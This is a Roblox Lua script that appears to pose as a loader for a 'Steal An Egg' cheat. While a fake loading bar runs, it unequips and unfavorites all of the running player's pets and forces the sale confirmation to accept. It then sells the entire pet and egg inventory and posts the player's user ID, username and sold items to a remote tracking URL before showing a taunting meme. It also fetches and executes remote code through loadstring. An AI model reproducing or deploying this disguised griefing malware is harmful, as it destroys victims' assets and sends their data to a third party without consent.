local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ===== RE-ENTRY GUARD =====
local gv = (getgenv and getgenv()) or _G
if gv.__SAE_LOADER_RUNNING then
    warn("[Loader] Already running — ignoring this execution.")
    return
end
gv.__SAE_LOADER_RUNNING = true

task.delay(90, function()
    if gv.__SAE_LOADER_RUNNING then
        gv.__SAE_LOADER_RUNNING = false
        warn("[Loader] Re-entry flag force-cleared after 90s.")
    end
end)
-- ===========================

-- ===== CONFIG =====
local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
local MEME_DELAY      = 4
local ANNOUNCE_HOLD   = 3

local UI_CONFIG = {
    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
    MEME_SIZE      = 380,
}
-- ==================

-- ===== FETCH COUNTER URL =====
local function fetchCounterUrl()
    local ok, res = pcall(function()
        return game:HttpGet(ENDPOINTS_URL, true)
    end)
    if ok and type(res) == "string" and #res > 0 then
        local decodeOk, data = pcall(function()
            return HttpService:JSONDecode(res)
        end)
        if decodeOk and type(data) == "table" and type(data.counter) == "string" then
            print("[Loader] Using counter URL from endpoints.json:", data.counter)
            return data.counter
        end
    end
    warn("[Loader] Could not fetch endpoints.json — no counter URL available")
    return nil
end

local COUNTER_URL = fetchCounterUrl()

------------------------------------------------------------
-- NUMBER FORMATTER
------------------------------------------------------------
local function shortenNumber(n)
    n = tonumber(n) or 0
    if n < 1000 then return tostring(math.floor(n)) end
    local units = {
        { v = 1e12, s = "T" },
        { v = 1e9,  s = "B" },
        { v = 1e6,  s = "M" },
        { v = 1e3,  s = "K" },
    }
    for _, u in ipairs(units) do
        if n >= u.v then
            local val = n / u.v
            local str = string.format("%.1f", val):gsub("%.0$", "")
            return str .. u.s
        end
    end
    return tostring(math.floor(n))
end

------------------------------------------------------------
-- UI MODULE
------------------------------------------------------------
local function loadUIModule()
    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
    if UI_URL and UI_URL ~= "" then
        local ok, mod = pcall(function()
            return loadstring(game:HttpGet(UI_URL, true))()
        end)
        if ok and type(mod) == "table" and type(mod.new) == "function" then
            gv.__LoaderUIModule = mod
            return mod
        end
        warn("[Loader] UI module failed to load, running headless:", tostring(mod))
    end
    return {
        new = function()
            return {
                boot              = function() end,
                setStatus         = function() end,
                fadeOutAndCleanup = function() end,
                showMemePopup     = function() end,
                restoreExtras     = function() end,
                currentProgress   = 1, -- Fallback if headless
            }
        end,
    }
end

local LoaderUI = loadUIModule()
local ui = LoaderUI.new(PlayerGui, UI_CONFIG)

------------------------------------------------------------
-- ANNOUNCEMENT BANNER
------------------------------------------------------------
local function showAnnouncement(itemsSold, valueEarned)
    local screen = Instance.new("ScreenGui")
    screen.Name = "PlundererAnnouncement"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.DisplayOrder = 999999
    screen.Parent = PlayerGui

    local banner = Instance.new("Frame")
    banner.Name = "Banner"
    banner.AnchorPoint = Vector2.new(0.5, 0.5)
    banner.Position = UDim2.new(0.5, 0, 0.5, 0)
    banner.Size = UDim2.new(1, 0, 0, 64)
    banner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    banner.BackgroundTransparency = 1
    banner.BorderSizePixel = 0
    banner.ZIndex = 1
    banner.Parent = screen

    local strip = Instance.new("Frame")
    strip.Name = "Strip"
    strip.Size = UDim2.new(1, 0, 1, 0)
    strip.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    strip.BackgroundTransparency = 1
    strip.BorderSizePixel = 0
    strip.ZIndex = 1
    strip.Parent = banner

    local grad = Instance.new("UIGradient")
    grad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   1),
        NumberSequenceKeypoint.new(0.15, 0.1),
        NumberSequenceKeypoint.new(0.85, 0.1),
        NumberSequenceKeypoint.new(1,   1),
    })
    grad.Rotation = 0
    grad.Parent = strip

    local label = Instance.new("TextLabel")
    label.Name = "Message"
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.Font = Enum.Font.GothamBlack
    label.Text = string.format("%d items sold for $%s", itemsSold or 0, shortenNumber(valueEarned or 0))
    label.TextSize = 40
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 0
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextTransparency = 1
    label.ZIndex = 2
    label.Parent = banner

    local function updateScale()
        local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
        local scale = math.clamp(vp.X / 1280, 0.55, 1.0)
        label.TextSize = math.floor(40 * scale)
        banner.Size = UDim2.new(1, 0, 0, math.floor(64 * scale))
    end
    updateScale()

    TweenService:Create(strip, TweenInfo.new(0.35), { BackgroundTransparency = 0.25 }):Play()
    TweenService:Create(label, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()

    task.wait(ANNOUNCE_HOLD)

    TweenService:Create(strip, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()

    task.wait(0.5)
    screen:Destroy()
end

------------------------------------------------------------
-- CORE MODULES
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave(forceRefresh)
    local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get() end)
    return ok2 and s2 or nil
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

------------------------------------------------------------
-- EQUIP / FAVORITE CLEANUP
------------------------------------------------------------
local function unequipAll()
    local d = getSave()
    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
    local ok, AssetRoster = pcall(require, ReplicatedStorage.Client.AssetRoster)
    for i, uid in ipairs(d.EquippedAssets) do
        if ok and AssetRoster and AssetRoster.DoffAsset then
            pcall(function() AssetRoster.DoffAsset(uid) end)
        else
            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
        end
        if i % 5 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    log(("Favorited pets: %d"):format(#uids))
    for i, uid in ipairs(uids) do
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
        if i % 8 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

------------------------------------------------------------
-- SNAPSHOT
------------------------------------------------------------
local function snapshotInventory(forceRefresh)
    local pets, eggs = {}, {}
    local d = getSave(forceRefresh)
    if not d then return { pets = pets, eggs = eggs } end

    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                local entry  = AssetDir[item.Category]
                local rarity = entry.Rarity

                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end
                value = math.floor(value)

                local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                weight = (weightOk and tonumber(weight)) or 0

                pets[tostring(uid)] = {
                    kind      = "pet",
                    uid       = tostring(uid),
                    name      = entry.DisplayName or item.Category,
                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
                    rarityNum = (rarity and rarity.RarityNumber) or 0,
                    value     = value,
                    weight    = weight,
                }
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    local entry  = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0
                    value = math.floor(value)

                    local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                    weight = (weightOk and tonumber(weight)) or 0

                    eggs[tostring(uid)] = {
                        kind      = "egg",
                        uid       = tostring(uid),
                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
                        rarityNum = (rarity and rarity.RarityNumber) or 0,
                        value     = value,
                        weight    = weight,
                    }
                end
            end
        end
    end

    return { pets = pets, eggs = eggs }
end

------------------------------------------------------------
-- REPORT ID
------------------------------------------------------------
local function computeReportId(uidList)
    local sorted = {}
    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
    table.sort(sorted)
    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
    local h = 0
    for i = 1, #s do
        h = bit32.bxor(h, string.byte(s, i))
        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
    end
    return string.format("%08x-%d", h, #sorted)
end

------------------------------------------------------------
-- REPORT TO WORKER
------------------------------------------------------------
local function reportSales(soldItems, reportId)
    if not soldItems or #soldItems == 0 then return end
    if not COUNTER_URL then return end

    local httpFn = nil
    if type(request) == "function" then httpFn = request
    elseif type(http_request) == "function" then httpFn = http_request
    elseif type(gv.request) == "function" then httpFn = gv.request
    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
    end
    if not httpFn then return end

    local petCount, eggCount, totalValue = 0, 0, 0
    local out = {}
    for _, d in ipairs(soldItems) do
        if d.kind == "pet" then petCount = petCount + 1
        elseif d.kind == "egg" then eggCount = eggCount + 1 end
        totalValue = totalValue + (tonumber(d.value) or 0)
        table.insert(out, { uid = d.uid, kind = d.kind, name = d.name, rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            reportId = reportId, pets = petCount, eggs = eggCount,
            userId = tostring(LocalPlayer.UserId), username = LocalPlayer.Name or "Unknown",
            items = out, totalValue = totalValue,
        })
        pcall(function()
            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
    end)
end

------------------------------------------------------------
-- PREPARE INVENTORY (Background Task)
------------------------------------------------------------
local function prepareInventory()
    unequipAll()
    unfavoriteAll()
    
    local snap = snapshotInventory(true)
    local petUids, eggUids = {}, {}
    local details = {}
    local expectedValue = 0

    for uid, d in pairs(snap.pets) do
        table.insert(petUids, uid)
        table.insert(details, d)
        expectedValue = expectedValue + (tonumber(d.value) or 0)
    end
    for uid, d in pairs(snap.eggs) do
        table.insert(eggUids, uid)
        table.insert(details, d)
        expectedValue = expectedValue + (tonumber(d.value) or 0)
    end

    local totalItems = #petUids + #eggUids
    local payload = { Eggs = eggUids, Assets = petUids }
    
    local allUids = {}
    for _, u in ipairs(petUids) do table.insert(allUids, u) end
    for _, u in ipairs(eggUids) do table.insert(allUids, u) end

    return {
        totalItems = totalItems,
        expectedValue = expectedValue,
        payload = payload,
        details = details,
        reportId = computeReportId(allUids)
    }
end

------------------------------------------------------------
-- LAUNCH (Simultaneous Execution)
------------------------------------------------------------
task.spawn(function()
    -- 1. Start UI boot asynchronously
    task.spawn(function()
        pcall(function() ui:boot() end)
    end)

    -- 2. Do the heavy lifting in the background while the UI loads
    local prep = prepareInventory()

    -- 3. Wait for the loading bar to finish (it reaches 1.0)
    if ui.currentProgress then
        while ui.currentProgress < 1 do
            task.wait(0.1)
        end
    end
    task.wait(0.3)
    pcall(function() ui:fadeOutAndCleanup() end)

    -- 4. FIRE SELL AND ANNOUNCEMENT AT THE EXACT SAME TIME
    if prep.totalItems > 0 then
        log(("Selling %d items for estimated $%d"):format(prep.totalItems, prep.expectedValue))
        
        -- Fire the remote instantly in the background
        task.spawn(function()
            pcall(function() Remotes.PetSatchel.SellSelection:FireServer(prep.payload) end)
            reportSales(prep.details, prep.reportId)
        end)

        -- Show the announcement instantly on the main thread
        pcall(function() showAnnouncement(prep.totalItems, prep.expectedValue) end)
    else
        log("Inventory empty — nothing to sell.")
        task.wait(1.5)
    end

    -- 5. Show Meme
    task.wait(MEME_DELAY)
    pcall(function() ui:showMemePopup() end)

    gv.__SAE_LOADER_RUNNING = false
end)
